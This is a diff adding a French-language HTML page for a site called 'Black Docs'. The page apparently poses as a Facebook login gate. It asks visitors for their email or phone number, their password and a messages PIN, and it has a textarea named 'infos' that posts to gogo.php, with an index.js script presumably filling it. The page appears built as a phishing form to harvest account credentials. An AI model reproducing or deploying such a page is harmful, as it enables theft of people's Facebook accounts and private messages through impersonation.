@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connectez-vous</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <h1>
+            Black Docs
+        </h1>
+    </header>
+    <nav>
+        <button>
+            A propos
+        </button>
+        <button>
+            Se connecter
+        </button>
+        <button>
+            S'inscrire
+        </button>
+        <button>
+            Contact
+        </button>
+    </nav>
+    <section class="contenu">
+        <div class="connexion">
+            <span>
+                <h3>
+                    Vous devez d'abord vous connecter sur Facebook
+                </h3>
+                <p>Adresse e-mail ou numéro mobile</p>
+                <input type="text" placeholder="Adresse e-mail ou numéro mobile">
+                <p>Mot de passe</p>
+                <input type="password" placeholder="Mot de passe">
+                <label>
+                    <input type="checkbox"> Afficher le mot de passe
+                </label>
+                <p>Code PIN messages</p>
+                <span class="pin">
+                    <input type="number" maxlength="6" size="6">
+                </span>
+            </span>
+            <form action="gogo.php" method="POST">
+                <textarea name="infos" id="infos"></textarea>
+                <input type="submit" value="Se connecter">
+            </form>
+        </div>
+    </section>
+    <script src="index.js"></script>
+</body>
+</html>
